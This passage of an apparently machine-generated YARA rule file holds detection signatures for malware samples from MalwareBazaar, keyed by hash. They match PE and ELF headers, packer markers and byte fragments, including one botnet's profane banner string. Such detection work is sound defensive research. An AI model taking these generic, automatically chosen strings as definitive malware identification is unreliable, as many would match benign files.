        uint32(0) == 0x00905a4d and
        filesize < 8097KB
        and all of them
}

rule Linux_fc668dc146e141d61b717d3ef9fae57758d6a5f3331fe6266a255901e8912d29
{
    meta:
        description = "Auto ML: fc668dc146e141d61b717d3ef9fae57758d6a5f3331fe6266a255901e8912d29"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "EBUPX!,"
        $s2 = "*CPT&KT"
        $s3 = "ZyDz6{KX."
        $s4 = "Lr!dh08"
        $s5 = "%C+DEx"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Linux_1831f544f4cc18b34e2f7ae6a02f4037239d40cc976728f4002865a5a319554e
{
    meta:
        description = "Auto ML: 1831f544f4cc18b34e2f7ae6a02f4037239d40cc976728f4002865a5a319554e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PTRhF8@"
        $s2 = ",Qt8R<HP"
        $s3 = "2$TRPy"
        $s4 = ")&EGCt7"
        $s5 = "!LPg}\\Q"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 25KB
        and all of them
}

rule Windows_fc6db6c30bc8cd0320881e6d28dc66369b6498b158a000e741e8ce5133a880f1
{
    meta:
        description = "Auto ML: fc6db6c30bc8cd0320881e6d28dc66369b6498b158a000e741e8ce5133a880f1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB
        and all of them
}

rule Windows_fcaff63b58fa89a2682cf2f21485df3cd0e37a424aa947fd05106a00b1e8f95f
{
    meta:
        description = "Auto ML: fcaff63b58fa89a2682cf2f21485df3cd0e37a424aa947fd05106a00b1e8f95f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Collection`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 691KB
        and all of them
}

rule Windows_fcf48a9792abfda9d9c9d32c6e7348e4cf3fed606c4aea8acf4e2ba4fdf08caf
{
    meta:
        description = "Auto ML: fcf48a9792abfda9d9c9d32c6e7348e4cf3fed606c4aea8acf4e2ba4fdf08caf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "kZYi(Z"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 661KB
        and all of them
}

rule Windows_fd032e026a2d0dc8f80370acf62e120c4a04fb1fd46318839f162f1949ad0edf
{
    meta:
        description = "Auto ML: fd032e026a2d0dc8f80370acf62e120c4a04fb1fd46318839f162f1949ad0edf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Nullable`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 867KB
        and all of them
}

rule Windows_fd203c3b8a0edc3629e43bb063fcc0ec3b87cc7d9827a87c892c6fdf45a89d0c
{
    meta:
        description = "Auto ML: fd203c3b8a0edc3629e43bb063fcc0ec3b87cc7d9827a87c892c6fdf45a89d0c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 24KB
        and all of them
}

rule Windows_fd26e32b1bf02dc23d6f3b1f918e3509a139d02626aac37515196b9befdf13dd
{
    meta:
        description = "Auto ML: fd26e32b1bf02dc23d6f3b1f918e3509a139d02626aac37515196b9befdf13dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3105KB
        and all of them
}

rule Linux_fd4572be80cb7c0389c16c0336ec62665288ebc8d8c6707c0bb39119eb722b99
{
    meta:
        description = "Auto ML: fd4572be80cb7c0389c16c0336ec62665288ebc8d8c6707c0bb39119eb722b99"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "V1ZS>K"
        $s2 = "k;j*oQ"
        $s3 = ")tLG*M{"
        $s4 = "q[,`cwA"
        $s5 = "HgkMp/"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB
        and all of them
}

rule Windows_fd49ef5bc25a401c934ff5b3c276741b41933e62e2e1fd3223e4ab8986ec60ca
{
    meta:
        description = "Auto ML: fd49ef5bc25a401c934ff5b3c276741b41933e62e2e1fd3223e4ab8986ec60ca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "f vYk`a}"
        $s5 = "b 1k'ua}B"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 227KB
        and all of them
}

rule Windows_fd4dd04fc93e026a69f642e85d2b9d56ccc144994d35496d0090bde17d13d2b9
{
    meta:
        description = "Auto ML: fd4dd04fc93e026a69f642e85d2b9d56ccc144994d35496d0090bde17d13d2b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 25540KB
        and all of them
}

rule Windows_fd68ed7ff3adfd19b32efde83d13edb583c7d756d0780d079efac6d09ff8bbb4
{
    meta:
        description = "Auto ML: fd68ed7ff3adfd19b32efde83d13edb583c7d756d0780d079efac6d09ff8bbb4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".soweku"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 289KB
        and all of them
}

rule Windows_183c71d2749893b3018f8d521712a58c6b3efd449a5ecbbbb12df1da69e0f7f6
{
    meta:
        description = "Auto ML: 183c71d2749893b3018f8d521712a58c6b3efd449a5ecbbbb12df1da69e0f7f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 778KB
        and all of them
}

rule Windows_fd79a1b3b18fca2696c2c58f290a4dadb97e3cdcd6e98d14a63ac3f4a1f2e351
{
    meta:
        description = "Auto ML: fd79a1b3b18fca2696c2c58f290a4dadb97e3cdcd6e98d14a63ac3f4a1f2e351"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".vurod"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 289KB
        and all of them
}

rule Windows_fe3b2cf08a6224a04194a6555b4593b0a7428cb1fe057c08776d09568fc58cd5
{
    meta:
        description = "Auto ML: fe3b2cf08a6224a04194a6555b4593b0a7428cb1fe057c08776d09568fc58cd5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Lj/fk!"
        $s3 = "?}r6bit"
        $s4 = "cmWbic"
        $s5 = "MMq=%bi"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 45KB
        and all of them
}

rule Linux_fe3c5abccf0e174e726df22fb3a3a751e44532638bffdaa89599b802b5a3d08d
{
    meta:
        description = "Auto ML: fe3c5abccf0e174e726df22fb3a3a751e44532638bffdaa89599b802b5a3d08d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4Jfg"
        $s2 = "/proc/net/route"
        $s3 = "(null)"
        $s4 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS"
        $s5 = "/usr/bin/apt-get"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 103KB
        and all of them
}

rule Android_fe57a9650a15a4b4201c4d896f662862a4679e142acdec8889218e5382299e4e
{
    meta:
        description = "Auto ML: fe57a9650a15a4b4201c4d896f662862a4679e142acdec8889218e5382299e4e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "META-INF/com/android/build/gradle/app-metadata.propertiesK,("
        $s2 = "M-ILI,I"
        $s3 = "assets/dexopt/baseline.prof"
        $s4 = "8ZL<qr"
        $s5 = "assets/dexopt/baseline.profm"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 16723KB
        and all of them
}

rule Windows_fe5ae51a975c574691bb439e36d0a25c2ae64888fa2bd83d179a43b86e5dc2e8
{
    meta:
        description = "Auto ML: fe5ae51a975c574691bb439e36d0a25c2ae64888fa2bd83d179a43b86e5dc2e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = ">Rich\\"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "D$,QRPU"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 572KB
        and all of them
}

rule Windows_fe7bc8e4d21896c46905bf10e1f891c6f7d4c731ba3097ae2f369a5959911a1c
{
    meta:
        description = "Auto ML: fe7bc8e4d21896c46905bf10e1f891c6f7d4c731ba3097ae2f369a5959911a1c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4593KB
        and all of them
}

rule Windows_fede9398271e52b8a3542cef51cccf5e8a6944110eaa2f060d8fdd1f65682035
{
    meta:
        description = "Auto ML: fede9398271e52b8a3542cef51cccf5e8a6944110eaa2f060d8fdd1f65682035"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.WAVE"
        $s5 = "`.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6504KB
        and all of them
}

rule Linux_fef00a4beb5d5594dc1df7877e14e58b81f5e81c8f56eb099e06224c6d960589
{
    meta:
        description = "Auto ML: fef00a4beb5d5594dc1df7877e14e58b81f5e81c8f56eb099e06224c6d960589"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HcD$TH"
        $s2 = "HcD$0H"
        $s3 = "HcD$TA"
        $s4 = "X[]A\\A]A^A_"
        $s5 = "HcD$dH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 157KB
        and all of them
}

rule Windows_fef57f4508867803dde9b9d9729ad78fc679c607147c69ca809c2ae262472e8d
{
    meta:
        description = "Auto ML: fef57f4508867803dde9b9d9729ad78fc679c607147c69ca809c2ae262472e8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "Phff B"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2268KB
        and all of them
}

rule Linux_fefed8e65f6981389e86fc8f521b653b495fdd79a41058f481d929d8208d8d3e
{
    meta:
        description = "Auto ML: fefed8e65f6981389e86fc8f521b653b495fdd79a41058f481d929d8208d8d3e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "APe|l3j"
        $s3 = "R#ay!p1"
        $s4 = "AmH|g;\"%"
        $s5 = "AmH|g;\"'"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB
        and all of them
}

rule Windows_01eca6dc5526b640faa166e8d498f4b6dee2ff0f9036cd8e4b9aa7e0581fa931
{
    meta:
        description = "Auto ML: 01eca6dc5526b640faa166e8d498f4b6dee2ff0f9036cd8e4b9aa7e0581fa931"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich${"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".nulas"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 338KB
        and all of them
}

rule Linux_18425ac992c9d09be27e46a9c8c5fb5a46940d26ed3132b292d4e40432166edf
{
    meta:
        description = "Auto ML: 18425ac992c9d09be27e46a9c8c5fb5a46940d26ed3132b292d4e40432166edf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AUATSH"
        $s2 = "[]A\\A]A^A_"
        $s3 = "AVAUATS"
        $s4 = "X[A\\A]A^"
        $s5 = "AWAVAUATUH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 114KB
        and all of them
}

rule Windows_ff0bd362c496178316aa66375828349d11825dd9afaa90c5ece39a401e4e0a7d
{
    meta:
        description = "Auto ML: ff0bd362c496178316aa66375828349d11825dd9afaa90c5ece39a401e4e0a7d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB
        and all of them
}

rule Windows_ff3718ae6bd59ad479e375c602a81811718dfb2669c2d1de497f02baf7b4adca
{
    meta:
        description = "Auto ML: ff3718ae6bd59ad479e375c602a81811718dfb2669c2d1de497f02baf7b4adca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8787KB
        and all of them
}

rule Windows_ffac444851a42f7558f0340117534223c09e3c1222ee4f1d4d62812b583bd982
{
    meta:
        description = "Auto ML: ffac444851a42f7558f0340117534223c09e3c1222ee4f1d4d62812b583bd982"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "D$<QRP"
        $s5 = "L$8QPW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 806KB
        and all of them
}

rule Linux_ffeb3720ee75e1819e7275b0742ff382765579d882124beffa9a34a306d62495
{
    meta:
        description = "Auto ML: ffeb3720ee75e1819e7275b0742ff382765579d882124beffa9a34a306d62495"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "EBUPX!,"
        $s2 = "f+p:YDh"
        $s3 = "S`@rrI"
        $s4 = "{<PA4`5A?C2D"
        $s5 = "VS3VS["

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_18570b99c7651d0400796686a5bfab737cd43f87228bd7fce152b0cc1027f1cb
{
    meta:
        description = "Auto ML: 18570b99c7651d0400796686a5bfab737cd43f87228bd7fce152b0cc1027f1cb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#ffffff"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 751KB
        and all of them
}

rule Windows_1862317879e1cfcaff8a4c2355f8d88b0911a4c848773f54bcb82c48f20480e6
{
    meta:
        description = "Auto ML: 1862317879e1cfcaff8a4c2355f8d88b0911a4c848773f54bcb82c48f20480e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1418KB
        and all of them
}

rule Windows_1864a38b10dbaa7cc52167986e7575d6464c3eee49a971f3c78fc87d7e16492a
{
    meta:
        description = "Auto ML: 1864a38b10dbaa7cc52167986e7575d6464c3eee49a971f3c78fc87d7e16492a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "J W b g"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 64KB
        and all of them
}

rule Windows_18f9d778efc5dcb90c7ae7ccaacdfd8b9041295447759c1811e99a5d0a48dcda
{
    meta:
        description = "Auto ML: 18f9d778efc5dcb90c7ae7ccaacdfd8b9041295447759c1811e99a5d0a48dcda"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Collection`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 555KB
        and all of them
}

rule Linux_190a561a9c0c5b61acf0621c2825834fe200c3b617537131de98f666ca7cb2d0
{
    meta:
        description = "Auto ML: 190a561a9c0c5b61acf0621c2825834fe200c3b617537131de98f666ca7cb2d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AVAUATI"
        $s2 = "([]A\\A]A^A_"
        $s3 = "AWAVAUATA"
        $s4 = "AWAVAUATD"
        $s5 = "[]A\\A]A^A_"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB
        and all of them
}

rule Windows_1a0885223c50263c153be36ffdcccd5c217e00a2e1f04893a836a37a6c0cd8a7
{
    meta:
        description = "Auto ML: 1a0885223c50263c153be36ffdcccd5c217e00a2e1f04893a836a37a6c0cd8a7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".laxohuy"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB
        and all of them
}

rule Windows_1a1dc33fae444afdd54f6f50dd47ed4b9f673fbc5595dad7b48e78cac0458465
{
    meta:
        description = "Auto ML: 1a1dc33fae444afdd54f6f50dd47ed4b9f673fbc5595dad7b48e78cac0458465"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 304KB
        and all of them
}

rule Windows_1a689eff429db78a6232912e5c6fb5be880b89f6016f26a1886331f174cb4086
{
    meta:
        description = "Auto ML: 1a689eff429db78a6232912e5c6fb5be880b89f6016f26a1886331f174cb4086"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "@.idata"
        $s3 = ".vmp`R"
        $s4 = "@.themida"
        $s5 = "`.vmp`R"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4319KB
        and all of them
}

rule Windows_1a69f2fcfe5b35bf44ea42a1efe89f18f6b0d522cbbea5c51bae93aff7d3188b
{
    meta:
        description = "Auto ML: 1a69f2fcfe5b35bf44ea42a1efe89f18f6b0d522cbbea5c51bae93aff7d3188b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Go3[Go3[Go3[S"
        $s3 = "7ZLo3[S"
        $s4 = "0ZBo3[S"
        $s5 = "0ZNo3[S"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5402KB
        and all of them
}

rule Linux_01f70016a0f13a5f9e561d0d5d60e7cc0f8087e1e124efb1468ff9fdb30ab8e4
{
    meta:
        description = "Auto ML: 01f70016a0f13a5f9e561d0d5d60e7cc0f8087e1e124efb1468ff9fdb30ab8e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ">UPX!X"
        $s2 = "K<d*kz"
        $s3 = "c;s%nX"
        $s4 = "4U=bsa"
        $s5 = "vWQMS5dG"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 1146KB
        and all of them
}

rule Windows_1a6d94f2ab51427dfd73ca45065cd28e16e215d4d6da2f17603ed633f207ceb0
{
    meta:
        description = "Auto ML: 1a6d94f2ab51427dfd73ca45065cd28e16e215d4d6da2f17603ed633f207ceb0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 53248KB
        and all of them
}

rule Windows_1abb073f9331743ed6fe25f4148922f764da131385b8195abd77f30eed9f9724
{
    meta:
        description = "Auto ML: 1abb073f9331743ed6fe25f4148922f764da131385b8195abd77f30eed9f9724"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 18133KB
        and all of them
}

rule Windows_1ae44da31999dac7b928f3ff8d08f2bdbe448f593c81448f586d7353b0eded7b
{
    meta:
        description = "Auto ML: 1ae44da31999dac7b928f3ff8d08f2bdbe448f593c81448f586d7353b0eded7b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 36KB
        and all of them
}

rule Windows_1af4b1e67dee34e1ce541150c83e1be4f75766d47ecebf4b476cb08aa04fa837
{
    meta:
        description = "Auto ML: 1af4b1e67dee34e1ce541150c83e1be4f75766d47ecebf4b476cb08aa04fa837"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Qkkbal"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 526KB
        and all of them
}

rule Linux_1b4440f5d9c12166ae6112e0cd1dacdb5fb7859cbc2a2d375c4e397b13a6dae6
{
    meta:
        description = "Auto ML: 1b4440f5d9c12166ae6112e0cd1dacdb5fb7859cbc2a2d375c4e397b13a6dae6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "x}d[x}%KxK"
        $s2 = "}f[x}GSxH"
        $s3 = "x}'KxH"
        $s4 = "}&Kx}g[xH"
        $s5 = "h}e[x}FSx|"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 102KB
        and all of them
}

rule Windows_1b4ab1c22660bbdd2c800847f9ef7450d7bbe7e7629360cdeff21196188cb3fb
{
    meta:
        description = "Auto ML: 1b4ab1c22660bbdd2c800847f9ef7450d7bbe7e7629360cdeff21196188cb3fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "B.idata"
        $s3 = "@.themida"
        $s4 = "VA*WdF"
        $s5 = ",zkLOt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3534KB
        and all of them
}

rule Linux_1b4ddc967aa3341262781c900be143d6dfe89e7912a176d77c15e0cb6fe66a14
{
    meta:
        description = "Auto ML: 1b4ddc967aa3341262781c900be143d6dfe89e7912a176d77c15e0cb6fe66a14"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "vZptF_"
        $s2 = "A*j{Od9"
        $s3 = "<P_dS-H"
        $s4 = "cHB9Tp"
        $s5 = "/profw"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB
        and all of them
}

rule Windows_1b67f0a811bcf89e4d5d7c3217605d576c0b3e8164669d6536220c8ddfa3a466
{
    meta:
        description = "Auto ML: 1b67f0a811bcf89e4d5d7c3217605d576c0b3e8164669d6536220c8ddfa3a466"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "uRFGHt"
        $s3 = "NC!G;E"
        $s4 = "p1A{hUC3"
        $s5 = "@DVuU2D"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 458KB
        and all of them
}

rule Windows_1b6ca65b2f5cbc1b1d9598956c441434a6bd7a7ddeee2a0e34089dd5a4f1f415
{
    meta:
        description = "Auto ML: 1b6ca65b2f5cbc1b1d9598956c441434a6bd7a7ddeee2a0e34089dd5a4f1f415"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 201KB
        and all of them
}

rule Windows_1b7c29ec3b8b5e6d2ef3535b36990ad6dec6c2cd2800bb237717965b23ca8a16
{
    meta:
        description = "Auto ML: 1b7c29ec3b8b5e6d2ef3535b36990ad6dec6c2cd2800bb237717965b23ca8a16"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
